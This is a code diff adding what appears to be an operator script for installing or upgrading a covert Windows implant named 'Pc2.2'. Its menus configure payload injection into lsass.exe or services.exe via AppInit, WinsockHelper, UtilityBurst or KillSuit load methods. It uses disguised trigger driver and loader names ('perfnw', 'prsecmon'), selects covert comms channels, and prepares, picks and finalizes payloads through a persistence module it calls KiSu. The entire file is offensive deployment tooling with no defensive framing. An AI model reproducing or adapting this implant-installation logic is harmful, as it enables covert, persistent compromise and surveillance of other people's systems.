@@ -1,0 +1,624 @@
+
+@include "_Arrays.dsi";
+@include "_LpHelperFunctions.dsi";
+@include "_Menu.dsi";
+@include "_VersionChecks.dsi";
+@include "_Pc2.2Final.dsi";
+
+@echo off;
+
+if (($argc != 2) ||
+	(($argv[1] != "INSTALL") && ($argv[1] != "UPGRADE")))
+{
+	echo("* Invalid parameter(s)", ERROR);
+echo "'$argv[1]'";
+	echo();
+	echo("Usage: $argv[0] <INSTALL|UPGRADE>");
+	return false;
+}
+
+string $arch, $os;
+if (!_GetArch($arch) || !_GetOsFamily($os))
+{
+	echo("* Failed to get ARCH + OS for install", ERROR);
+	return false;
+}
+
+string %params;
+_AppendString(%params{'loadMethods'}, "WinsockHelper");
+if ($arch == "i386")
+{
+	_AppendString(%params{'loadMethods'}, "UtilityBurst");
+}
+if (`script _IsKisuAvailable.dss -project DeMi -quiet`)
+{
+	_AppendString(%params{'loadMethods'}, "KillSuit");
+}
+_AppendString(%params{'loadMethods'}, "AppInit");
+
+_AppendString(%params{'commsTypes'}, "Winsock");
+_AppendString(%params{'commsTypes'}, "FlewAvenue");
+
+# setup defaults
+%params{'project'}		= "Pc2.2";
+%params{'loadChoice'}	= %params{'loadMethods'}[0];
+%params{'commsChoice'}	= %params{'commsTypes'}[1];
+%params{'loadbinType'}	= "sharedlib";
+%params{'nopause'}		= "true";
+%params{'arch'}			= $arch;
+%params{'os'}			= $os;
+%params{'driverName'}	= "perfnw";
+%params{'infoValue'}	= "prsecmon";
+if (_IsWindowsNt4())
+{
+	%params{'procName'}		= "services.exe";
+}
+else if (_IsWindows8OrGreater()) {
+	echo("FAILURE - UNSUPPORTED PLATFORM", ERROR);
+	return false;
+}
+else if (_IsWindowsVistaOrGreater())
+{
+	%params{'procName'}		= "services.exe";
+}
+else
+{
+	%params{'procName'}		= "lsass.exe";
+}
+
+if ($argv[1] == "INSTALL")
+{
+	%params{'script'}	= "_Install.dss";
+	%params{'python'}	= "_Install.py";
+	%params{'action'}	= "Install";
+    %params{'script_Pc2.2'}	= "_Pc2.2Install.dss";
+	%params{'python_Pc2.2'}	= "_Pc2.2Install.py";
+}
+else if ($argv[1] == "UPGRADE")
+{
+	%params{'script'}	= "_Upgrade.dss";
+	%params{'python'}	= "_Upgrade.py";
+	%params{'action'}	= "Upgrade";
+    %params{'script_Pc2.2'}	= "_Pc2.2Upgrade.dss";
+	%params{'python_Pc2.2'}	= "_Pc2.2Upgrade.py";
+}
+else
+{
+	echo("* Invalid action ($argv[1])", ERROR);
+	return false;
+}
+
+# create menu
+string %menu;
+if (!_CreateMenu(%menu, "%params{'project'} %params{'action'}", %params{'hmenu'}) || !defined(%params{'hmenu'}) ||
+	!_SetHeader(%menu, %params{'hmenu'}, "PcHeader" ) ||
+	!_AddSection(%menu, %params{'hmenu'}, "Configuration", %params{'hsConfig'}) || !defined(%params{'hsConfig'}) ||
+	!_AddOption(%menu, %params{'hsConfig'}, "Change load method", "ChangeLoadMethod") || 
+	!_AddOption(%menu, %params{'hsConfig'}, "Change COMMS type", "ChangeCommsType") ||
+	!_AddOption(%menu, %params{'hsConfig'}, "Change loader name", "ChangeLoaderName", false, %params{'hChangeLoader'}) || 
+	!_AddOption(%menu, %params{'hsConfig'}, "Change trigger driver name", "ChangeTriggerName", true, %params{'hChangeTrigger'}) || 
+	!_AddOption(%menu, %params{'hsConfig'}, "Change process name", "ChangeProcessName", true, %params{'hChangeProcess'}) || 
+	!_AddSection(%menu, %params{'hmenu'}, "KiSu Connection", %params{'kisuConnection'}) || !defined(%params{'kisuConnection'}) ||
+	!_AddOption(%menu, %params{'kisuConnection'}, "Connect to PC's KiSu", "ConnectToKiSu", false, %params{'kisuConnection_connect'}) || 
+	!_AddOption(%menu, %params{'kisuConnection'}, "Disconnect from KiSu", "DisconnectFromKiSu", false, %params{'kisuConnection_disconnect'}) || 
+	!_AddOption(%menu, %params{'kisuConnection'}, "Change to PC's KiSu", "ChangeToKiSu", false, %params{'kisuConnection_change'}) || 
+	!_AddOption(%menu, %params{'kisuConnection'}, "Install PC's KiSu", "InstallKiSu", false, %params{'kisuConnection_install'}) || 
+	!_AddSection(%menu, %params{'hmenu'}, "Payload", %params{'hsPayload'}) || !defined(%params{'hsPayload'}) ||
+	!_AddOption(%menu, %params{'hsPayload'}, "Prepare a new payload", "PrepPayload") ||
+	!_AddOption(%menu, %params{'hsPayload'}, "Pick an existing payload", "PickPayload") ||
+	!_AddSection(%menu, %params{'hmenu'}, "Actions", %params{'hsActions'}) || !defined(%params{'hsActions'}) ||
+	!_AddOption(%menu, %params{'hsActions'}, "Perform %params{'action'}", "PerformAction"))
+{
+	echo("*** Unable to create %params{'project'} menu ***", ERROR);
+	return false;
+}
+_HideOption(%menu, %params{'hChangeTrigger'});
+
+return _ExecuteMenu(%menu, %params{'hmenu'}, %params);
+
+#------------------------------------------------------------------------------#
+sub ChangeCommsType(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $choice;
+	if (!_ExecuteSimpleMenu("Choose a Comms type", %params{'commsTypes'}, $choice) || !defined($choice))
+	{
+		return true;
+	}
+	
+	if (defined($choice))
+	{
+		%params{'commsChoice'} = $choice;
+	}
+	
+	if ($choice != "FlewAvenue")
+	{
+		_ShowOption(%menu, %params{'hChangeTrigger'});
+	}
+	else
+	{
+		_HideOption(%menu, %params{'hChangeTrigger'});
+	}
+	
+	# reset payload since this change may have invalidated that choice
+	UndefKey(%params, "payloadName");
+	UndefKey(%params, "payloadFile");
+	
+	return true;
+	
+}	/* end ChangeCommsType */
+
+#------------------------------------------------------------------------------#
+sub ChangeLoadMethod(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $choice;
+	if (!_ExecuteSimpleMenu("Choose a load method", %params{'loadMethods'}, $choice) || !defined($choice))
+	{
+		return true;
+	}
+	
+	if (defined($choice))
+	{
+		%params{'loadChoice'} = $choice;
+	}
+	
+	if ($choice == "UtilityBurst")
+	{
+		_HideOption(%menu, %params{'hChangeProcess'});
+		_ShowOption(%menu, %params{'hChangeLoader'});
+	}
+	else
+	{
+		_ShowOption(%menu, %params{'hChangeProcess'});
+		_HideOption(%menu, %params{'hChangeLoader'});
+	}
+	
+	# reset payload since this change may have invalidated that choice
+	UndefKey(%params, "payloadName");
+	UndefKey(%params, "payloadFile");
+	
+	return true;
+	
+}	/* end ChangeLoadMethod */
+
+#------------------------------------------------------------------------------#
+sub ChangeLoaderName(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $name;
+	if (!GetInput("Enter the new loader name", $name, %params{'infoValue'}) || !defined($name))
+	{
+		return true;
+	}
+	
+	%params{'infoValue'} = $name;
+	return true;
+	
+}	/* end ChangeLoaderName */
+
+#------------------------------------------------------------------------------#
+sub ChangeProcessName(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $name;
+	if (!GetInput("Enter the new process name", $name, %params{'procName'}) || !defined($name))
+	{
+		return true;
+	}
+	
+	%params{'procName'} = $name;
+	return true;
+	
+}	/* end ChangeProcessName */
+
+#------------------------------------------------------------------------------#
+sub ChangeTriggerName(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $name;
+	if (!GetInput("Enter the new trigger driver name", $name, %params{'driverName'}) || !defined($name))
+	{
+		return true;
+	}
+	
+	%params{'driverName'} = $name;
+	return true;
+	
+}	/* end ChangeTriggerName */
+
+#------------------------------------------------------------------------------#
+sub PcHeader(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	_HideOption(%menu, %params{'kisuConnection_disconnect'});
+	_HideOption(%menu, %params{'kisuConnection_connect'});
+	_HideOption(%menu, %params{'kisuConnection_change'});
+	_HideOption(%menu, %params{'kisuConnection_install'});
+	
+	$cont = true;
+	
+	echo "Current Configuration:";
+	echo "     Load Method : %params{'loadChoice'}";
+	if (%params{'loadChoice'} == "UtilityBurst")
+	{
+		echo "     Loader Name : %params{'infoValue'}";
+	}
+	else
+	{
+		echo "    Process Name : %params{'procName'}";
+	}
+	echo "      COMMS Type : %params{'commsChoice'}";
+	if (%params{'commsChoice'} != "FlewAvenue")
+	{
+		echo "    Trigger Name : %params{'driverName'}";
+	}
+	if (!defined(%params{'payloadName'}))
+	{
+		echo("         Payload : None", WARNING);
+	}
+	else
+	{
+		echo("         Payload : %params{'payloadName'}", DEFAULT);
+		
+		# determine payload file short name
+		string $shortFile;
+		RegExMatch("^.*[/\\\\]+(.*)[/\\\\]+(.*)\$", %params{'payloadFile'}, $shortFile);
+		echo("                   $shortFile[0]/$shortFile[1]", DEFAULT);
+	}
+	
+	# check on KiSu connected status
+	int $id;
+	string $status = "Unknown";
+	int $state = WARNING;
+	if (GetEnv("_DEMI_KISU_COMMS_ESTABLISHED", $id))
+	{
+		_ShowOption(%menu, %params{'kisuConnection_disconnect'});
+		
+		# connected -- is it to a PC KiSu?
+		if ($id == GetKiSuId())
+		{
+			$status = "Connected";
+			$state = DEFAULT;
+		}
+		else
+		{
+			$status = "Connected to non-PC KiSu";
+			_ShowOption(%menu, %params{'kisuConnection_change'});
+		}
+	}
+	else
+	{
+		_ShowOption(%menu, %params{'kisuConnection_connect'});
+		_ShowOption(%menu, %params{'kisuConnection_install'});
+		$status = "Not connected";
+	}
+	echo(" KiSu Connection : $status", $state);
+		
+	return true;
+	
+}	/* end PcHeader */
+
+#------------------------------------------------------------------------------#
+sub PerformAction(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	int $kisuId;
+	if (GetEnv("_DEMI_KISU_COMMS_ESTABLISHED", $kisuId) && ($kisuId != GetKiSuId()))
+	{
+		echo("* You are connected to a non-PC KiSu", WARNING);
+		if (!prompt("Do you want to continue?", False))
+		{
+			return true;
+		}
+	}
+	
+	if (!defined(%params{'payloadFile'}))
+	{
+		echo("* A payload has not been assigned", ERROR);
+		pause;
+		return true;
+	}
+	
+	# we need to know if we install via normal or special methods
+	string $menuItems;
+	string $cmd;
+	string $method = "Trigger Driver";
+	string $project = "DmGz";
+	string $args = "%params{'driverName'}";
+	if (%params{'commsChoice'} == "FlewAvenue")
+	{
+		$method = "FLAV";
+		$project = "FlAv";
+		$args = "FlAv";
+	}
+	_AppendString($menuItems, "Do Not %params{'action'} $method");
+	_AppendString($cmd, "");
+	
+	_AppendString($menuItems, "%params{'action'} $method Normally");
+	_AppendString($cmd, "python Install/%params{'python'} -project $project -args \"-driver $args -method dsz\"");
+	
+	_AppendString($menuItems, "%params{'action'} $method via KISU");
+	_AppendString($cmd, "python Install/%params{'python'} -project $project -args \"-driver $args -method demi\"");
+	
+	string $selectedString;
+	int $selectedIndex;
+	if (!_ExecuteSimpleMenu("Install $method?", $menuItems, $selectedString, $selectedIndex))
+	{
+		echo("* Failed to get choice", ERROR);
+		return false;
+	}
+	if (defined($selectedIndex))
+	{
+		if ($cmd[$selectedIndex] != "")
+		{
+			if (!`$cmd[$selectedIndex]`)
+			{
+				echo("* Failed to %params{'action'} $method", ERROR);
+				pause;
+				return true;
+			}
+		}
+	}
+
+	if (%params{'loadChoice'} == "UtilityBurst")
+	{
+		# UtilityBurst install
+		if (!`script Install/%params{'script'} -project UtBu -args "\\"%params{'payloadFile'}\\" %params{'infoValue'}"`)
+		{
+			echo("* Failed to %params{'action'} PC", ERROR);
+			pause;
+			return true;
+		}
+	}
+	else if (%params{'loadChoice'} == "AppInit")
+	{
+		# AppInit install
+		if (!`script AppInit/%params{'script_Pc2.2'} -project Pc2.2 -args "\\"%params{'payloadFile'}\\" \\"%params{'procName'}\\""`)
+		{
+			echo("* Failed to %params{'action'} PC", ERROR);
+			pause;
+			return true;
+		}
+	}
+	else if (%params{'loadChoice'} == "WinsockHelper")
+	{
+		# WinsockHelper install
+		if (!`script WinsockHelp/%params{'script_Pc2.2'} -project Pc2.2 -args "\\"%params{'payloadFile'}\\" \\"%params{'procName'}\\""`)
+		{
+			echo("* Failed to %params{'action'} PC", ERROR);
+			pause;
+			return true;
+		}
+	}
+	else if (%params{'loadChoice'} == "KillSuit")
+	{
+		# WinsockHelper install
+		if (!`python Install/winnt/KiSu/%params{'python_Pc2.2'} -project Pc2.2 -args "\\"%params{'payloadFile'}\\" \\"%params{'procName'}\\""`)
+		{
+			echo("* Failed to %params{'action'} PC", ERROR);
+			pause;
+			return true;
+		}
+	}
+	else
+	{
+		echo("* Unknown load type (%params{'loadChoice'})", ERROR);
+		return true;
+	}
+
+	if( !Finalize( %params{'payloadFile'} ) )
+	{
+		echo("* Unable to finalize deployed payload", ERROR );
+		return true;
+	}
+	
+	return true;
+	
+}	/* end PerformAction */
+
+#------------------------------------------------------------------------------#
+sub PickPayload(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $extraArgs = "-arch %params{'arch'} -os %params{'os'} -type Level4 -verbose";
+	StrCat($extraArgs, " -extra Comms=%params{'commsChoice'}");
+	StrCat($extraArgs, " -binType %params{'loadBinType'}");
+	if (%params{'loadChoice'} == "UtilityBurst")
+	{
+		StrCat($extraArgs, " -utilityburst");
+	}
+	
+	@record on;
+	if (!`python Payload/_Pc2.2Prep.py -project Pc2.2 -args "-action pick $extraArgs"`)
+	{
+		echo("* Failed to pick payload", ERROR);
+		pause;
+		return true;
+	}
+	@record off;
+	
+	string $file, $name;
+	if (!GetCmdData("Payload::Description", $name) || !defined($name) ||
+		!GetCmdData("Payload::File", $file) || !defined($file))
+	{
+		echo("* Failed to get payload information", ERROR);
+		pause;
+		return true;
+	}
+	
+	%params{'payloadName'} = $name;
+	%params{'payloadFile'} = $file;
+	return true;
+	
+}	/* end PickPayload */
+
+#------------------------------------------------------------------------------#
+sub PrepPayload(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	$cont = true;
+	
+	string $extraArgs = "-arch %params{'arch'} -os %params{'os'} -type Level4";
+	StrCat($extraArgs, " -extra Comms=%params{'commsChoice'}");
+	StrCat($extraArgs, " -binType %params{'loadBinType'}");
+	if (%params{'loadChoice'} == "UtilityBurst")
+	{
+		StrCat($extraArgs, " -utilityburst");
+		if (StrLen(%params{'infoValue'}) > 0)
+		{
+			StrCat($extraArgs, " -info %params{'infoValue'}");
+		}
+	}
+	else
+	{
+		if (StrLen(%params{'procName'}) > 0)
+		{
+			StrCat($extraArgs, " -process %params{'procName'}");
+		}
+	}
+	
+	if (%params{'commsChoice'} != "FlewAvenue")
+	{
+		if (StrLen(%params{'driverName'}) > 0)
+		{
+			StrCat($extraArgs, " -driver %params{'driverName'}");
+		}
+	}
+	
+	@record on;
+	if (!`python Payload/_Pc2.2Prep.py -project Pc2.2 -args "-action configure $extraArgs"`)
+	{
+		echo("* Failed to configure payload", ERROR);
+		return true;
+	}
+	@record off;
+	
+	# assume that they want to pick whatever one they just configured
+	string $file, $name;
+	if (!GetCmdData("Payload::Description", $name) || !defined($name) ||
+		!GetCmdData("Payload::File", $file) || !defined($file))
+	{
+		echo("* Failed to get payload information", ERROR);
+		return true;
+	}
+	
+	%params{'payloadName'} = $name;
+	%params{'payloadFile'} = $file;
+	return true;
+	
+}	/* end PrepPayload */
+
+#------------------------------------------------------------------------------#
+sub ConnectToKiSu(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+	$cont = true;
+	echo "Connecting to KiSu installation";
+	if (`kisu_connect -type pc`)
+	{
+		echo("    SUCCESS", GOOD);
+	}
+	else
+	{
+		echo("    FAILURE", ERROR);
+		pause;
+	}
+	
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub ChangeToKiSu(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+	$cont = true;
+
+	bool $bPause = false;
+	echo "Disconnecting from KiSu installation";
+	if (`kisu_disconnect`)
+	{
+		echo("    SUCCESS", GOOD);
+		Sleep(3000);
+	}
+	else
+	{
+		echo("    FAILURE", ERROR);
+		$bPause = true;
+	}
+	
+	
+	echo "Connecting to KiSu installation";
+	if (`kisu_connect -type pc`)
+	{
+		echo("    SUCCESS", GOOD);
+	}
+	else
+	{
+		echo("    FAILURE", ERROR);
+		$bPause = true;
+	}
+	
+	if ($bPause)
+	{
+		pause;
+	}
+	
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub DisconnectFromKiSu(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+	$cont = true;
+	echo "Disconnecting from KiSu installation";
+	if (`kisu_disconnect`)
+	{
+		echo("    SUCCESS", GOOD);
+		Sleep(3000);
+	}
+	else
+	{
+		echo("    FAILURE", ERROR);
+		pause;
+	}
+	
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub(int) GetKiSuId()
+{
+	# defined in the .xml file for KISU
+	return 0x7a43e1fa;
+}
+
+#------------------------------------------------------------------------------#
+sub InstallKiSu(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+	$cont = true;
+	echo "Install PC KiSu installation";
+	if (`kisu_install -type pc`)
+	{
+		echo("    SUCCESS", GOOD);
+	}
+	else
+	{
+		echo("    FAILURE", ERROR);
+		pause;
+	}
+	
+	return true;
+}
